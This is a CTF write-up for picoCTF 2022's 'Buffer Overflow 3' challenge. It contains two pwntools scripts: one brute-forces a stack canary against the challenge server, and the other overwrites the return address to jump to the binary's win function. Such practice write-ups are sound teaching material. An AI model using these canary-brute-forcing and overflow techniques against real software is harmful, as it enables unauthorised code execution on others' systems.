---
name: Buffer Overflow 3 (2022)
event: Pico CTF 2022
category: Pwn
description: Writeup for Buffer Overflow 3 (Pwn) - Pico CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Buffer Overflow 3

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=1676 "Pico CTF 2022: Buffer Overflow 3")

## Description

> Do you think you can bypass the protection and get the flag?

## Solution

#### canary_brute.py

{% code overflow="wrap" %}
```py
from pwn import *
import string

elf = context.binary = ELF('./vuln', checksec=False)
context.log_level = 'critical'

canary = ""

while len(canary) < 4:
    not_found = True
    while not_found:
        for i in string.printable:
            # p = elf.process()
            p = remote('saturn.picoctf.net', 63681)
            padding = 64

            test = canary + i
            print(test)
            payload = b'A' * padding
            payload += f'{test}'.encode()

            p.sendlineafter(b'>', str(len(payload)).encode())

            p.sendlineafter(b'>', payload)

            if b'Smashing' in p.recvline():
                p.close()
                continue
            else:
                canary += i
                not_found = False
                p.close()
                break
```
{% endcode %}

#### exploit.py

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x8049534
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
padding = 64

payload = flat(
    b'A' * padding,
    b'BiRd',  # Canary is here
    b'A' * 16,  # Saved RBP + int
    elf.symbols.win
)

io.sendlineafter(b'>', str(len(payload)).encode())

# Send the payload
io.sendlineafter(b'>', payload)

# Receive the flag
io.recvuntil(b'?')
io.interactive()
```
{% endcode %}
